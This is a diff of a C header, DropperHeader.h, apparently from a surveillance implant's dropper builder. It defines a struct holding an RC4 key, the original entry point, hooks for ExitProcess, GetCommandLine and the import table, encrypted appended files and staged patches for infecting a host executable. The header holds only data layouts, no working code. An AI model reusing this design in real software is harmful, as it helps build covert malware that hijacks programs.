@@ -2,12 +2,7 @@
 #define DropperHeader_h__
 
 #include "common.h"
-
-// RC4
-enum {
-	RC4KEYLEN = 32,
-	VERSIONLEN = 32,
-};
+#include "rc4.h"
 
 
 #ifdef WIN32
@@ -54,13 +49,55 @@ typedef ALIGN4 struct _data_section_files {
 	DataSectionCryptoPack codec;
 } DataSectionFiles;
 
+
+
+typedef  __declspec(align(4)) struct _data_section_header 
+{
+	// RC4
+	// Encryption key
+	CHAR rc4key[RC4KEYLEN];
+
+	// OEP
+	WINSTARTFUNC   pfn_OriginalEntryPoint;
+
+	// Synchronization
+	DWORD synchro;
+
+	// used to pass full qualified path to core thread
+	CHAR *dllPath;
+
+	// our own functions
+	struct {
+		DataSectionBlob newEntryPoint;
+		DataSectionBlob coreThread;
+		DataSectionBlob dumpFile;
+		DataSectionBlob exitProcessHook;
+		DataSectionBlob exitHook;
+		DataSectionBlob GetCommandLineAHook;
+		DataSectionBlob GetCommandLineWHook;
+		DataSectionBlob rvaToOffset;
+		DataSectionBlob rc4;
+		DataSectionBlob hookIAT;
+		DataSectionBlob load;
+	} functions;
+
+	DataSectionFiles files;
+
+	PatchBlob stage1;
+	PatchBlob stage2;
+
+	DataSectionBlob restore;
+
+	ULONG exeType;
+	BOOL isScout;
+
+	CHAR instDir[10];
+	CHAR eliteExports[18];
+	CHAR version[20];
+} DropperHeader;
+
+/*
 typedef ALIGN4 struct _data_section_header {
-	// RCSCooker version
-	CHAR version[VERSIONLEN];
-	
-	// Action to be performed ... will be used for generic payload
-	DWORD flags;
-	
 	// RC4 encryption key
 	CHAR rc4key[RC4KEYLEN];
 	
@@ -87,19 +124,13 @@ typedef ALIGN4 struct _data_section_header {
 		DataSectionBlob dumpFile;
 		DataSectionBlob exitProcessHook;
 		DataSectionBlob exitHook;
+		DataSectionBlob GetCommandLineAHook;
+		DataSectionBlob GetCommandLineWHook;
 		DataSectionBlob rvaToOffset;
 		DataSectionBlob rc4;
 		DataSectionBlob hookCall;
 		DataSectionBlob load;
 	} functions;					// COOKED
-
-	// strings
-	DataSectionBlob stringsOffsets; // COOKED
-	DataSectionBlob strings;
-
-	// dlls and addresses
-	DataSectionBlob dlls; 			// COOKED
-	DataSectionBlob callAddresses;
 
 	// appended files
 	DataSectionFiles files;			// COOKED
@@ -111,10 +142,12 @@ typedef ALIGN4 struct _data_section_header {
 	// saves state, jump to dropper and return to OEP
 	DataSectionBlob restore;
 
-	// THIS LAST TWO FIELDS MUST NOT BE MOVED!
-	DWORD offsetToHeader;
-	DWORD headerEndMarker;
+	ULONG exeType;
+	BOOL isScout;
 
+	CHAR instDir[10];
+	CHAR eliteExports[18];
+	CHAR version[20];
 } DropperHeader;
-
+*/
 #endif // DropperHeader_h__
